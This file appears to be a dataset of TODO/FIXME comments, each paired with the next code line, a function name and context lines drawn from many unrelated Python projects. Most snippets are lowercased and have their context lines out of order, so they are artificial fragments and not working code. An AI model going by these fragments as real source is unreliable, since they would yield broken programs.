# todo: given trial, a repo, and an observer </s> pass	test_in_memory_hyperparams_repository_should_be_observable def test_in_memory_hyperparams_repository_should_be_observable(): repo: InMemoryHyperparamsRepository = InMemoryHyperparamsRepository()
# todo: refactor linodeexception, args[0] should be error_id </s> if e.args[0] == 5:	delete_zone data = self.connection.request(API_ROOT, params=params).objects[0] except LinodeException, e: raise ZoneDoesNotExistError(value='', driver=self, zone_id=zone.id)
# todo: add safety tests so that when something fails it fails with a good error </s> path = none	get_path def get_path(self, node): if 'nodeset' in node.attrib: path = node.attrib['nodeset']
# todo: configurable timeout </s> kill_timeout = 3	_stop_container def _stop_container(self, container): self.docker_client.stop(container.container_id, timeout=kill_timeout)
# todo: deal with scroll position </s> self._fontgroup.width = minimumwidth + 200	setFontItemText if minimumWidth > self._fontGroup.width:
# todo: finish </s> for name in self.__dict__:	validate def validate(self): aname = name[1:] attribute = self.__dict__[aname]
# fixme: todo </s> return results	execute_query result.append(value) results.append(ResultRow(*result))
# todo: deal with error </s> with open(os.path.join(ttfolder, "mastermodel.pickle"), "rb") as f:	DSFont outputWriter(output) vfFontData, error = await compileDSToBytes(self._fontPath, ttFolder, outputWriter) self.masterModel = pickle.load(f) assert len(self.masterModel.deltaWeights) == len(self.doc.sources)
# todo: use the device specific template here </s> return self.default_save_template	save_template @property def save_template(self):
# todo cid_map?? </s> assert len(get_checkins()) > 100	test def test():
#todo: redo this with html parser instead of regex </s> return htmlparser.results	local htmlparser.feed(xml_str)
# todo[yanndupis]: get rid of these torch references when extending hook_args </s> new_args, new_kwargs, new_type = sy.frameworks.torch.hook_args.unwrap_args_from_function(	handle_func_command except AttributeError: pass cmd, args, kwargs )
# todo do something with temp </s> for state, distn in enumerate(self.dur_distns):	resample_dur_distns def resample_dur_distns(self,temp=None): distn.resample_with_truncations( data=
# todo: extend to other types </s> assert isinstance(arr_typ, types.array)	isna_overload if arr_typ == string_array_type: return lambda arr,i: hpat.str_arr_ext.str_arr_is_na(arr, i) dtype = arr_typ.dtype if isinstance(dtype, types.Float):
# todo: experiment with when to apply conv </s> note_octave = timedistributed(conv1d(octave_units, 2 * octave, padding='same'))(notes)	build_model beat = Activation('tanh')(beat) beat = Dropout(dropout)(beat) note_octave = Activation('tanh')(note_octave) note_octave = Dropout(dropout)(note_octave)
# todo: re-enable for hardware </s> self.dpids = [str(self.rand_dpid()) for _ in range(n_dps)]	build_net if acl_in_dp is None: acl_in_dp = {} self.dpids[0] = self.dpid self.topo = mininet_test_topo.FaucetStringOfDPSwitchTopo(
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
# todo: check that the birth date is not in the future </s> if calc_check_digit_pers(number[:-1]) != number[-1]:	validate else: birth_date = get_birth_date(number) raise InvalidChecksum() return number
# todo make os portable for windows users </s> if not prefix.endswith("/"):	__drop_prefix if not filepath.startswith(prefix): return filepath prefix += "/" if sys.hexversion < 0x2060000:
# todo: distinguish between urllib and urllib2 contracts </s> class tufdownloadmixin( object ):	TUFDownloadMixin def tuf_open( self, tuf_updater, data = None ): filename, headers = self.tuf_retrieve( tuf_updater, data = data )
# todo: if the user supplied the full nonsymbolic image_shape and </s> return conv2d_fft(node.inputs[0], node.inputs[1], **kwargs)	_gpu_conv_to_fftconv node.op.imshp[-1] % 2 == 1): kwargs['pad_last_dim'] = True
# todo: fix signature of zip() in typeshed. </s> returns, inferred_types = cast(any, zip)(*unioned_return)	check_overload_call else: if unioned_return: unioned_result = (make_simplified_union(list(returns), context.line,
#todo - handle this with a pipe? </s> filename = "emboss/temp_%s.txt" % temp_format	check_AlignIO_to_EMBOSS if temp_format in skip_formats : continue temp_handle = open(filename,"w") try :
# todo: why are we uncommenting html? </s> self.html = utils.make_html_element(	PageParser self._parse_json() else: self.response.text.replace('<!--', '').replace('-->', ''), url=self.response.url, )
# todo: logs which are observably relevant should be sent to the client (e.g. the warning of refusing to have more receivers active) </s> logging.basicconfig(level=logging.info)	_main_async argv = sys.argv if not _abort_for_test: log.startLoggingWithObserver(log.PythonLoggingObserver(loggerName='shinysdr').emit, False) argParser = argparse.ArgumentParser(prog=argv[0])
# todo: enumerate the axes in a message </s> return values	vary if 'host' in values: self.setMessage(name, rs.VARY_HOST)
# todo: check if page are exists </s> fd, filename = tempfile.mkstemp('w')	test_confluence_auth space = 'SAN' title = 'atlassian-python-rest-api-wrapper' os.write(fd, b'Hello World - Version 1') result = confluence.attach_file(filename, None, title=title, space=space, comment='upload from unittest')
# todo: optimize </s> signature_text = ''	cm_refresh signatures = script.call_signatures() logger.info('signatures: %s', signatures) if len(signatures)>0: signature = signatures[-1]
# todo: remove this - cura-4482 </s> material = global_container_stack.material	_determineQualityAndQualityChangesForQualityChanges Logger.log("e", "Could not find the global quality changes container with name %s", quality_changes_name) return None quality_type = global_quality_changes.getMetaDataEntry("quality_type") extruder_stacks = ExtruderManager.getInstance().getActiveExtruderStacks()
# todo: progress +kwargs </s> else:	push GIT_SSH_COMMAND="ssh -S %s" % cnct.ctrl_path): rm.push(refspec=refspec, progress=progress, **kwargs) rm.push(refspec=refspec, progress=progress, **kwargs)
# todo: ... </s> pass	send_nutrition_data def send_nutrition_data(): Send received nutrition data to DHIS2.
# todo: (longer term) rather than abort, reject this candidate </s> assert (self._name is none or	dist self._dist = abstract_dist.get_pkg_resources_distribution() assert self._dist is not None self._name == canonicalize_name(self._dist.project_name)) assert (self._version is None or
# todo: dump content out for debugging in the future. </s> pass	dump_test_information for iframe in iframes:
# todo: remove with neuralnet.__setstate_050__ </s> return path	pickled_cuda_net_path pickle.dump(net_pickleable, f)
# todo: verify that workid is the primary key someplace. </s> yield workitem.dowork()	work yield NamedLock.acquire(txn, workItem.group) yield workItem.delete() except NoSuchRecord: pass
parts.append(fmt[f:f_next])  # todo backslash-escapes, at least \n </s> f = f_next	Printf if f_next < 0: f_next = len(fmt) if f >= len(fmt): if v >= len(vals):
# todo: error detection </s> ctype = obj.collection_type()	serialize def serialize(obj): Save an object to the database. for x in obj: serialize_item(obj,x)
pass # todo </s> def can_undo(self):	can_undo
# todo: uncomment this line once we're on django 1.11 </s> "oldest_user": min("date_joined"),	statistics user_aggregate = { "count": Count("id"), "inbox_count__avg": Avg("inbox_count"), "inbox_count__sum": Sum("inbox_count"),
# todo what should the swissnum _actually_ be? </s> self._http_server = httpserver(self._storage_server, b"abcd")	setUp def setUp(self): self.storage_server = StorageServer(self.mktemp(), b"\x00" * 20) self.client = StorageClient( DecodedURL.from_text("http://example.com"),
# todo: hide and stop spinner </s> pass	state_changed return if state != nm.NM_STATE_CONNECTING: else: pass
# todo add code </s> self.poll.question = "yours"	test_update def test_update(self): self.poll.save() p = Poll.objects.get()
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
v_plus = self.probe_dtz_no_ep(board) # todo: change to probe_dtz </s> if v_plus is none:	probe_dtz_no_ep v = 0 if v == 2 else -101 else: return NOne v = -v_plus
# todo: typing for pb </s> def to_pb(self) -> any:	to_pb pb_msg = pb.StreamInfo( peer=self.peer_id.to_bytes(),
# todo: set cookie </s> theme = settings['theme']	theme_loader theme = SETTINGS['Theme'] except KeyError: try: with open(os.path.join(THEME_LOC, theme, 'index.html'), 'rb') as buf:
# todo: start here </s> for path in self._fs.ls(dir_path):	_archive_dir tar_gz_name = ( self._working_dir_mgr.name('dir', dir_path, name) + '.tar.gz') pass
#todo test this </s> for mem_access, v in m.items():	sum_mem_access_to_bytes i.e., aggregate the transfer numbers for all types into a single byte count. result = {} new_key = (mem_access.stride, mem_access.direction) bytes_transferred = int(mem_access.dtype.itemsize) * v
# todo: use cli.output.write </s> interface.rprint(result)	_process_input result = interface.reval(code) if api.visible(): except SyntaxError as e: status[0] = False
assert study_id == 0  # todo </s> self.trials[trial_id].params[param_name] = value	report_param def report_param(self, study_id, trial_id, param_name, value):
# todo: lacp timeout configurable. </s> if lacp_age > 10:	state_expire if port.dyn_lacp_up: lacp_age = now - port.dyn_lacp_updated_time self.logger.info('LACP on %s expired', port) self.lacp_down(port)
# todo: we probably don't need this? just to be safe </s> for i in range(len(norm_groups)):	step grad_norms=norm_groups, ) updated_params = _unflatten_dense_tensors( self.fp16_groups_flat[i], self.fp16_groups[i]
# todo: action value doesn't exist for beta </s> baseline_policy = dict(	test_early_horizon_estimate horizon=2, estimate_horizon='early', estimate_actions=True, estimate_terminal=True ) network=dict(type='auto', size=7, depth=1, internal_rnn=1), distributions=dict(float='gaussian')
# todo: distinguish between text elements with actual whitespace </s> try:	_scraped_content tag: BeautifulSoup Tag Returns: string content_div = Facebook._div(tag, 0, 0) except IndexError:
# todo: change the frontend to pass seconds instead. </s> expires_at = (now_in_seconds + one_hour_in_seconds) * 1000	test_existing_email_create_user return {'sub': 'email', 'email': email, 'exp': id_token_expiration_timestamp} monkeypatch.setattr(AuthBackend, '_get_user_info', userinfo_mock) existing_user = User.objects.create(username="email/foo@bar.net", email=email) resp = client.get(
# :todo: raises systemerror on python 2.6, </s> def testnumpyarray(self):	Test greyscale=True, alpha=False, bitdepth=1) if sys.version_info > (2, 6): numpy or self.skipTest("numpy is not available") pixels = numpy.array([[0, 0x5555], [0x5555, 0xaaaa]], numpy.uint16)
# todo: remove this once uses have migrated to that new interface. </s> bq_client = bigquery.client	init_bigquery 'account in the Kernels Settings sidebar.') return bq_client(*args, **kwargs) bigquery.Client = lambda *args, **kwargs:  monkeypatch_bq( bq_client, *args, **kwargs)
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
# todo: not clear that this is even used. </s> "ux_bucket_url": pulumi.output.concat(	__init__ "JWT_SECRET_ID": secret.secret.arn, "USER_AUTH_TABLE": db.user_auth_table.name, "https://", ux_bucket.bucket_regional_domain_name ),
# todo: remove </s> if history_files:	log_index_of_last_upload history_files = [x for x in _dir if x[-4:] == ".bz2"] max_log_index = 0 assert self.config()["user_id"] == history_files[0].split("_", 1)[0] for history_file in history_files:
# todo(termie): optimize this call at some point and put it into the </s> roles = metadata_ref.get('roles', [])	authenticate user_id=user_ref['id'], tenant_id=tenant_ref['id']) if not roles: raise exception.Unauthorized(message='User not valid for tenant.')
# todo use deepcopy() here </s> return polygonsonimage(polygons, shape)	on else: polygons = [poly.project(self.shape, shape) for poly in self.polygons]
# todo color </s> bottoms.append(	command_syntax for argument in command_info["arguments"]: command_args.append(argument["name"]) ("class:bottom-toolbar.on", f"({comamnd_group}) {command} {command_args}") )
# todo: use google-diff-patch-match library to diff the sources? </s> from nbdime import diff	diff_single_cells def diff_single_cells(a, b): return diff(a, b)
direct = false  # todo: test on undirect, but too long atm </s> orig_pwd = getpwd()	test_add_archive_content_strip_leading @with_tempfile(mkdir=True) def test_add_archive_content_strip_leading(path_orig, url, repo_path): chpwd(repo_path) repo = AnnexRepo(repo_path, create=True, direct=direct)
# todo: do the computation without the 'sr' enforcement </s> mat_expr = matrix([[mat[i,j].expr(method='sr') for i in range(self._nc)]	jacobian_det raise ValueError("the Jacobian matrix is not a square matrix") mat = self.jacobian() for j in range(self._nc)]) det = mat_expr.det() # the unsimplified determinant
# todo check </s> return self.tags	LiveDecoder @interfacedoc def metadata(self):
# todo: also use backward pass </s> h = fw	get_permute_model ) fw = states[0][1] logits = tf.contrib.layers.linear(h, target_size) predict = tf.arg_max(tf.nn.softmax(logits), 1)
# todo: figure out a way to actually log this information without </s> multiprocessing.active_children()	multiprocessing_SIGCHLD def multiprocessing_SIGCHLD(self, sig, stack):
# todo: implement </s> pass	unlink def unlink(self, path, relative_to=None):
# todo: add this back in once we've merged back the refactored users code </s> self.assertequals(users_count, 1)	testStealCommCareUser users_count = CouchUser.view("users/by_commcare_username_domain", key=[self.domain, self.commcare_username]).total_rows
# todo: tighten foolscap schema to require exactly 32 bytes. </s> self._write_file('crypttext_hashes', ''.join(hashes))	remote_put_crypttext_hashes def remote_put_crypttext_hashes(self, hashes): precondition(not self.closed)
# todo(harlowja): is there a better way to do this?? </s> del fs[path]	_del_item_path @staticmethod def _del_item_path(fs, path):
# todo check validity </s> return(tag in self.tags)	has_tag def has_tag(self,tag):
# todo find if genesis block can be non-zero. why does 'earliest' option even exist? </s> at_header = chain.get_canonical_block_by_number(0).header	getBalance at_header = chain.get_canonical_head() elif at_block == 'earliest': else: at_header = chain.get_canonical_block_by_number(int(at_block)).header
# todo(tsileo): handle tombstone </s> data = db.outbox.find_one({'id': item_id, 'meta.deleted': false})	outbox_activity @app.route('/outbox/<item_id>/activity') def outbox_activity(item_id): if not data: abort(404)
# todo: duplicate checking </s> self._associate.append((association_type, value))	add def add(self, association_type: LicenseAssociationType, value: str):
# todo: how to check it? meybe we can omit this test </s> pass	test_gausianfill def test_gausianfill():
# todo : pytest.mark.parametrise once nose is gone. </s> def test_collections_defaultdict():	test_collections_defaultdict a = defaultdict() a.default_factory = a
# todo: do this when we want to switch off ctrl-c </s> shutit.get_default_child().sendline(r'')	ctrl_c_signal_handler shutit = shutit_frame.f_locals['shutit'] if shutit.cfg['build']['ctrlc_passthrough']: return print "You may need to wait for the command to complete for a pause point"
# todo add support for dynamically picking version of </s> gc_request = groupcoordinatorrequest[0](group_id)	_find_group_coordinator_id name as a string. :return: The node_id of the broker that is the coordinator. gc_response = self._send_request_to_node(self._client.least_loaded_node(), gc_request) success = self._client.cluster.add_group_coordinator(group_id, gc_response)
# todo: create a lint plugin for that to enforce using the helper </s> self.assertequal(httpstatus.not_found, response.status_code)	assert404 def assert404(self, response):
# todo implement. </s> yaml = self.master_model.to_yaml()	_train def _train(self, rdd, nb_epoch, batch_size, verbose, validation_split):
last = 50 if 'last' not in parameters else int(parameters['last'][0])  # todo check integer! </s> sort_by = none if 'sort_by' not in parameters else parameters['sort_by'][0]  # todo check integer!	ChannelsEndpoint Sanitize the parameters and check whether they exist first = 1 if 'first' not in parameters else int(parameters['first'][0])  # TODO check integer! sort_asc = True if 'sort_asc' not in parameters else bool(int(parameters['sort_asc'][0])) query_filter = None if 'filter' not in parameters else parameters['filter'][0]
# todo remove get_media_references </s> multimedia = app.get_media_references()	get_app_view_context if app.get_doc_type() == 'Application': try: except ProcessTimedOut as e: notify_exception(request)
# todo: decompose=true </s> assert_allclose(new_wp.data, x, rtol=1e-12)	test_data_reconstruction_delete_nodes_2d assert_allclose(new_wp.reconstruct(update=True), x, rtol=1e-12)
# todo: move to base class </s> return self._manipulationmode	Canvas @property def manipulationMode(self): @manipulationMode.setter def manipulationMode(self, value):
# todo: no idea of how to check correct logging via any kind of assertion yet. </s> runner = runner(dry=false)	test_runner_log_stderr def test_runner_log_stderr(): cmd = 'echo stderr-Message should be logged >&2' ret = runner.run(cmd, log_stderr=True)
# todo verify layer exists in geoserver? </s> def _add_wms_layer(layer_name):	add_wms_layer def add_wms_layer(self,  layer_name, base_url): self.layers.append(GeonotebookLayer(layer_name)) cb = self._remote.add_wms_layer(layer_name, base_url).then(
# todo: this needs test coverage. </s> return self.dates[self._country_group[lifetimes][start_date][:]]	asset_start_dates @lazyval def asset_start_dates(self):
# todo(sbauza): remove the service_id filter in a later release </s> model_query(context, models.computenode, session=session).\	service_destroy filter_by(id=service_id).\ soft_delete(synchronize_session=False) filter(or_(models.ComputeNode.service_id == service_id, models.ComputeNode.host == service['host'])).\
# todo: it would be more helpful just to quietly recreate the data source config from get params </s> return none	report_preview_data return None except DataSourceConfigurationNotFoundError:
# todo make this a private api </s> sub_request = """	addSimpleHTTPAuthHeader def addSimpleHTTPAuthHeader(self): <GeocodeRequest returnFreeForm="{is_freeform}"> <Address countryCode="{query_type}">
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
# todo: cronjob (celery task) to delete stale tokens </s> except emailchangerequest.doesnotexist:	change_email email_confirmation_request = EmailChangeRequest.objects.get( token=token, valid_until__gte=now()) return TemplateResponse(request, 'registration/invalid_token.html') if request.user != email_confirmation_request.user:
raise valueerror("bucket might not exist")  # todo: create custom exception for easier handling </s> read_acl_perm_allowed = true	check_perm_read_acl ClientError if bucket.exists != BucketExists.YES: try: self.s3_client.get_bucket_acl(Bucket=bucket.name)
# todo: remove this once all dependent code has been cleaned up </s> self.output_quantizer = self.output_quantizers[0]	QcQuantizeStandAloneBase is_symmetric, enabled_by_default=True)] self._mode = QcQuantizeOpMode.PASSTHROUGH @abc.abstractmethod
# todo: test, to be sure it doesn't mess things up </s> with open("/proc/sys/kernel/sched_child_runs_first") as f:	__init__ l.error("AFL Error: Suboptimal CPU scaling governor") raise InstallError("execute 'cd /sys/devices/system/cpu; echo performance | sudo tee cpu*/cpufreq/scaling_governor'") if not "1" in f.read(): l.error("AFL Warning: We probably want the fork() children to run first")
# todo(phawkins): enable when there is an lu implementation for gpu/tpu. </s> self._compileandcheck(jsp.linalg.lu, args_maker, check_dtypes=true)	testLu check_dtypes=True, tol=1e-3)
# @todo: make a lookup table in diseasedatamodel: </s> field("test_type"),	CaseTrackingModel default = "PENDING", ), Field("result"), s3_date("result_date",
self.pos_emb = posencoding(max_seq_len * 10, d_model) # todo: *10 fix </s> self.dropout_emb = nn.dropout(dropout)	Decoder self.d_model = d_model self.tgt_emb = nn.Embedding(tgt_vocab_size, d_model, padding_idx=data_utils.PAD, ) self.layer_type = DecoderLayer if not weighted else WeightedDecoderLayer self.layers = nn.ModuleList(
# todo docstring </s> desired_node_applications = []	change_node_configuration def change_node_configuration(self, desired_configuration, hostname): docstring for change_node_configuration for node in desired_configuration.nodes: if node.hostname == hostname:
#invalidate any overlapping cached value #todo extract remaining valid bits </s> p = where	putcache p+=1 return value while p <= where+size/8: if p in used:
# todo. check if build_url_fname can be used. </s> newpath = "/".join(['..']*3 + [newpath])	display_first_image_as_thumbnail self.report.add_lnkref_to_photo(photo, lnkref) real_path, newpath = self.report.prepare_copy_media(photo) if constfunc.win(): newpath = newpath.replace('\\',"/")
# todo: command+c for mac </s> tk.messagebox.showerror("internal error. use ctrl+c to copy",	on_tk_exception sys.last_traceback = tb traceback.print_exception(exc, val, tb) traceback.format_exc())
# todo: connect to actual event in playlist </s> self._emit_propchange('org.mpris.mediaplayer2.player', {	Shuffle playlist = xl.player.QUEUE.current_playlist playlist.set_shuffle_mode('track' if value_b else 'disabled') 'Shuffle': Variant('b', value_b),
# todo(lyarwood): remove the following in 16.0.0 pike </s> self._test_get_encryptor('luksencryptor',	test_get_encryptors self._test_get_encryptor('luks', luks.LuksEncryptor) luks.LuksEncryptor) self._test_get_encryptor('nova.volume.encryptors.luks.LuksEncryptor',
#todo - introduce an annotated alignment class? </s> alignment._annotations = gr	next % (len(ids), self.records_per_alignment)) alignment = Alignment(self.alphabet) alignment_length = len(seqs.values()[0]) for id in ids :
# todo: this is not the most efficient approach - refactor this functionality into util </s> resource_db = self.to_model(self)	get_uid def get_uid(self): resource_uid = resource_db.get_uid() return resource_uid
raise notimplementederror  # todo </s> @asyncio.coroutine	XBoardProtocol @asyncio.coroutine def configure(self): def quit(self): self.send_line("quit")
constant_liar: bool = false,  # todo(hvy): remove default value and fix unit tests. </s> ) -> tuple[list[optional[float]], list[tuple[float, float]]]:	_get_observation_pairs study: Study, param_name: str, This function collects observation pairs from the complete or pruned trials of the study. The values for trials that don't contain the parameter named ``param_name`` are set to None.
#todo(cp16net): need to set the return code correctly </s> return wsgi.result(views.instanceview(server).data(), 201)	create image_id, body['flavor']).data()
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
# xxx todo </s> section = "checking"	write_checking_config Write configuration options in section "checking".
# todo error #248 </s> return package	fetch_commits username, repo_name = package.repo_name().split('/') except ValueError: r = requests.get( url='https://api.github.com/repos/{}/{}/commits'.format(username, repo_name),
#todo 接上 qa bot </s> return none	getResponseForCustomQA if api_key is None: return None
#todo add types and return and rtype </s> data = '\n'.join([d.strip() for d in self.docs['in']['raw'].split('\n')])	_extract_docs_params def _extract_docs_params(self): composed by tuples (parameter, description). listed = 0 loop = True
# todo: use a bytearray? </s> buf = initial	read_buffered EOFError is raised with exc.buffered set to any bytes left in the buffer. while len(buf) < numbytes: try:
# todo(termie): this stuff should probably be moved to middleware </s> if not context['is_admin']:	create_tenant def create_tenant(self, context, **kw): user_token_ref = self.token_api.get_token( context=context, token_id=context['token_id'])
# todo: account for conversion if tz other than gmt not specified </s> return d.strftime('%y%m%d%h%m%s')	rfc1123ToDigits14 setLocale() d = datetime.datetime.strptime(rfc1123DateString, '%a, %d %b %Y %H:%M:%S %Z')
# todo add binary column (drop support for python 2.7) </s> df = pd.dataframe({	test_to_sql @with_cursor() def test_to_sql(self, cursor): 'col_int': np.int32([1]), 'col_bigint': np.int64([12345]),
#todo: add index to conc_call_agg </s> conc_call_agg.insert(	set_concurrentcall_analytic }) if not get_cc_obj: { "date": date_minprec,
# todo: remove getattr when https://github.com/rtfd/readthedocs.org/pull/3339 got merged </s> env_build_image != getattr(self.config, 'build_image', self.version.project.container_image),	is_obsolete return any([ env_python_version != Version(self.config.python_version),
#todo show this </s> return schema + "__" + backref_name	get_backref def get_backref(self, schema, backref_name):
hda.dataset.job_id = job.id  # todo: can't add attr to dataset in __init__(). why? </s> trans.sa_session.add(hda.dataset)	store_dataset_job_id trans.sa_session.add(job) for hda in hdas: trans.sa_session.flush()  # TODO: do we need this here? Or let the next flush handle this?
#todo: issue warning that this is an unsafe operation, but doing it cause user insists </s> try:	atomic_move e = get_exception() if unsafe_writes and e.errno == errno.EBUSY: try: out_dest = open(dest, 'wb')
# todo: write me </s> raise notimplementederror('s3 cache does not yet implement the .remove() method.')	remove def remove(self, layer, coord, format):
# todo(kan-bayashi): documentation and type hint </s> def rational_quadratic_spline(	rational_quadratic_spline inputs, unnormalized_widths,
# todo: implement me! </s> else:	custom_login else: print('disabled account') # Return a 'disabled account' error message print('disabled account') # Return an 'invalid login' error message. else:
# todo: should this raise ioerror? </s> with raises(ioerror):	test_invalid_data_byte def test_invalid_data_byte(): read_file(HEADER_ONE_TRACK + """ 4d 54 72 6b  # MTrk
status = offline # todo: all the cases </s> self.callback_presence(presence(identifier=idd, status=status))	serve_forever status = ONLINE else: elif t == 'message': channel = event['channel']
# todo: remove after py2.5 deprecation </s> if sys.version_info[:2] > (2, 5):	test_tab_2226_tblastn_011 self.assertEqual('random_s00', qresult.id) self.assertEqual(0, len(qresult)) with warnings.catch_warnings(record=True) as w: warnings.simplefilter('always')
# todo(guillermooo): further restrict valid register names. </s> return super().__getitem__(key.lower())	__getitem__ if key in ('%', '#'): raise ValueError('unsupported key: %s' % key)
# todo(b/114938612): eventually remove this override. </s> validate=false,	testPreprocessingFn file_pattern=os.path.join(self._testdata_path, 'csv_example_gen/train/*'), telemetry_descriptors=['Tests'], schema=legacy_metadata.schema)
# todo: once/if we have gpu and language labels then we might be </s> filters = {"label": ["_orchest_project_uuid"]}	clear_environment_images This is to avoid the issue of having environments with mismatching Orchest SDK versions. for img in docker_client.images.list(filters=filters): docker_client.images.remove(img.id)
# todo: use invalidation time </s> params: channelfull, channel to dump, mediaid of the profile photo in the db	dump_supergroup def dump_supergroup(self, supergroup_full, supergroup, photo_id): Returns -""" timestamp = round(time.time())
assert study_id == 0  # todo(akiba) </s> trial_id = len(self.trials)	create_new_trial_id def create_new_trial_id(self, study_id): self.trials.append(trial.Trial(trial_id)) return trial_id
# todo: move this test elsewhere. </s> selenium = self.selenium	test_the_editor_forgets_its_content_on_form_submission def test_the_editor_forgets_its_content_on_form_submission(self): find_element = selenium.find_element_by_css_selector cat = CategoryFactory()
# todo: replace with copy function </s> new_landmark_manager = deepcopy(landmark_manager)	update landmark_manager : :class:`LandmarkManager` The landmark manager to copy from. new_landmark_manager._target = self.__target self._landmark_groups.update(new_landmark_manager._landmark_groups)
raise  # todo </s> else:	deploy_contract cached_contract = self.__contract_cache[contract_name] except KeyError: self.__registrar.enroll(contract_name=contract_name, contract_address=address,
#todo fixme: we need to check that we aren't adding a duplicate </s> item.addclaim(claim)	addClaims pywikibot.output('Adding %s --> %s' % (claim.getID(), claim.getTarget().getID()))
output = []  # todo should this be user defined? </s> for datum in data:	marshal :param role: name of a role to use when marshaling :returns: list of marshaled objects output.append(self.get_mapper(data=datum).marshal(role=role)) return output
# todo: this is a jump. </s> vi_cmd_data['motion']['command'] = '_vi_forward_slash'	vi_forward_slash def vi_forward_slash(vi_cmd_data): vi_cmd_data['motion']['args'] = {'mode': vi_cmd_data['mode'], 'count': vi_cmd_data['count'], 'search_string': vi_cmd_data['user_motion_input']} vi_cmd_data['count'] = 1
#todo add movement callbacks to target if movable </s> self.fire_all_weapons(dest)	try_attack_target self.stop()
# xxx todo </s> return none, none	_process_packet if self._packet.stream_index == self._video_stream_index: if self._packet.timestamp < 0: video_packet = VideoPacket(self._packet) if _debug:
# todo add something like this in the future, its cleaner than the </s> return names	_sub_modules name.parent = imp names.append(name)
# todo pass this to json shcema validation </s> for id_name in data:	put 'message': 'could not find movie with id %d in list %d' % (movie_id, list_id)}, 404 data = request.json if set(id_name.keys()) & set(allowed_ids) == set([]): return {'status': 'error',
# todo deal with pylint error in cleaner fashion than this </s> try:	move_win def move_win(from_path, to_path): shutil.copy(from_path, to_path) from exceptions import WindowsError as win_except except ImportError as e:
# todo(b/134950354): test embedding column for non-eager mode only for now. </s> if not tf.executing_eagerly():	testCombinedFeatureColumnInput specs[indicator_key] = tensor_spec.TensorSpec([1], tf.int32) expected_dim += len(vocab_list) embedding_key = 'embedding_key' embedding_dim = 3
# todo(b/130724878): these conversions should not be needed. </s> return cls(	from_anon_tuple @classmethod def from_anon_tuple(cls, anon_tuple, round_num): model=anon_tuple.model._asdict(recursive=True), optimizer_state=list(anon_tuple.optimizer_state),
# todo add the ability to `git reset --hard` the dataset tree on failure </s> raise commanderror(code=cmd_exitcode)	__call__ cmd_exitcode = e.code if not rerun or rec_exitcode != cmd_exitcode: lgr.info("== Command exit (modification check follows) =====")
# todo: allow answer to repeat previous or go back after a mistake </s> answer = pywikibot.inputchoice(u'what should be done?', ['accept', 'reject', 'give up', 'accept all'], ['a', 'r', 'g', 'l'], 'a')	assemble answer = 'a' else: if answer == 'l':  # accept all acceptall = True
# todo: @sbharadwajj implement and test </s> raise notimplementederror	_jac_mat_prod def _jac_mat_prod(self, module, g_inp, g_out, mat):
# todo: move this function to user.query </s> return dbsession.query(cls).filter(cls.user_name==username).first()	by_user_name @classmethod def by_user_name(cls, username):
'path': upload.filename,  # todo path? </s> 'urls': {	figshare_upload_file_to_article 'project': node.parent_id, 'node': node._primary_key, 'view': rv['urls']['view'], 'download': rv['urls']['download'],
reference_doctype='todo' and reference_name='{0}'""".format(todo.name)) </s> self.asserttrue(len(email_queue) == 1)	test_feedback_trigger todo.save(ignore_permissions=True) email_queue = frappe.db.sql("""select name from `tabEmail Queue` where frappe.db.sql('delete from `tabEmail Queue`') result = accept(request_key, "test-feedback@example.com", "ToDo", todo.name, "Great Work !!", 4, fullname="Test User")
# todo: check syntax </s> try:	content_type @SingleFieldValue def content_type(self, name, values): media_type, params = values[-1].split(";", 1) except ValueError:
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	refresh_security_group_members def refresh_security_group_members(self, security_group_id):
# todo test errors </s> assert_array_equal(expect, actual)	test_advanced_indexing_1d_bool actual = z[ix]
#todo: add method </s> episodeinfo = {'ids': {'imdb': 'tt2161930'}}	doManualRating logger.debug("Getting data for manual %s of non-library '%s' with ID of '%s'" % (action, media_type, data['remoteid'])) if utilities.isEpisode(media_type): summaryInfo = {'title': 'Show Title', 'year': 2015, 'season': data['season'], 'number': data['episode']} userInfo = {'ratings' : globals.traktapi.getEpisodeRatingForUser(data['imdbnumber'], data['season'], data['episode'])}
# todo time complecity </s> bottoms.append(	render if command_info.get('arguments'): command_args = [arg['name'] for arg in command_info['arguments']] ("class:bottom-toolbar.on", f"({comamnd_group}) {self.command_holder.command} {command_args}") )
# todo(john sirois): https://github.com/pantsbuild/pex/issues/1059 </s> pex_verbosity = cast(int, env.pex_verbose)	_spawn_pip_isolated "a", ] pip_verbosity = pex_verbosity // 3 if pip_verbosity > 0:
# todo remove? </s> yield key_stmt[0].name, value_stmt	iterate yield call.name, value_stmt else: else: if stmt.assignment_details:
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo: test </s> self.add_dir(general_v.path, "rewriteengine", "on")	redirect_all_ssl return self.create_redirect_vhost(ssl_vhost) else: self.add_dir(general_v.path, "RewriteRule", ["^.*$", "https://%{SERVER_NAME}%{REQUEST_URI}", "[L,R=permanent]"]) self.save("Redirect all to ssl")
# todo(zhengzhenyu): handle this when the api supports creating </s> sort_keys, sort_dirs = db.process_sort_params(sort_keys, sort_dirs,	get_by_filters build_requests = cls.get_all(context) default_dir='desc')
